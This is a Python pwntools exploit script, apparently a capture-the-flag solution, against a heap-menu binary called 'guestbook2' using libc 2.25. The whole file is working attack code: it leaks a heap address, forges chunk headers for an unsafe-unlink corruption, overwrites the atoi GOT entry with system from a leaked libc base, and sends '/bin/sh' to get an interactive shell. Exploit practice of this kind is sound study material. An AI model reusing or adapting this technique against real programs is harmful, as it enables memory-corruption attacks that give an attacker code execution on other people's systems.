from pwn import *

p=process('./guestbook2')

e=ELF('./guestbook2')

libc=ELF('./libc-2.25.so')

def add(data):

    p.recvuntil('Your choice: ')

    p.sendline('2')

    p.recvuntil('Length of new post: ')

    p.sendline(str(len(data)))

    p.recvuntil('Enter your post: ')

    p.send(data)

def show():

    p.recvuntil('Your choice: ')

    p.sendline('1')

def edit(index,data):

    p.recvuntil('Your choice: ')

    p.sendline('3')

    p.recvuntil('Post number: ')

    p.sendline(str(index))

    p.recvuntil('Length of post: ')

    p.sendline(str(len(data)))

    p.recvuntil('Enter your post: ')

    p.send(data)

def remove(index):

    p.recvuntil('Your choice: ')

    p.sendline('4')

    p.recvuntil('Post number: ')

    p.sendline(str(index))

add('a')

add('a')

add('a')

add('a')

remove(0)

remove(2)

add('12345678')

show()

p.recvuntil('12345678')

heap_addr=u64(p.recv(4).ljust(8,'\x00'))

heap_base=heap_addr-0x1810-0x10-0x120

chunk_addr=heap_base+0x30

print 'heap base address: ',hex(heap_base)

print 'chunk list address: ',hex(chunk_addr)

remove(0)

remove(1)

remove(3)

gdb.attach(p,'b* 0x400bc2')

size0 = 0x90+0x80

add(p64(0)+p64(size0+1)+p64(chunk_addr-0x18)+p64(chunk_addr-0x10))

add("a"*0x80+p64(size0)+p64(0x90)+"a"*0x80+(p64(0)+p64(0x91)+"a"*0x80)*2)

remove(2)

payload='a'*8+p64(1)+p64(8)+p64(e.got['atoi'])

edit(0,payload)

show()

p.recvuntil('0. ')

leak_addr=u64(p.recv(6).ljust(8,'\x00'))

print hex(leak_addr)

libc_base=leak_addr-libc.symbols['atoi']

system_addr=libc_base+libc.symbols['system']

print 'system_address: ',hex(system_addr)

#gdb.attach(p,'b* 0x400f7c')

edit(0,p64(system_addr))

p.recvuntil('Your choice: ')

p.sendline('/bin/sh')

p.interactive()

